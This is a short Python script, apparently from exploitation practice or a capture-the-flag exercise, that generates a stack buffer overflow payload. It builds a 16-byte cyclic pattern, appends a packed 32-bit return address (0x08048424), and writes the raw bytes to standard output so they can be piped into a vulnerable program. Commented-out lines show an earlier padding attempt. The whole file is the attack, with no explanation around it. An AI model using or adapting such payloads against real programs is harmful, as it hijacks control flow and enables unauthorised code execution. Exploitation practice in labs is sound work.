#!/usr/bin/env python3
import struct
import sys
import os
from pwnpy.pwn import *

#buf = b'A'*0xf0
#buf += b'\n'

buf = create_pattern(0x10)
buf += struct.pack('I', 0x08048424)

sys.stdout.buffer.write(buf)
sys.stdout.flush()
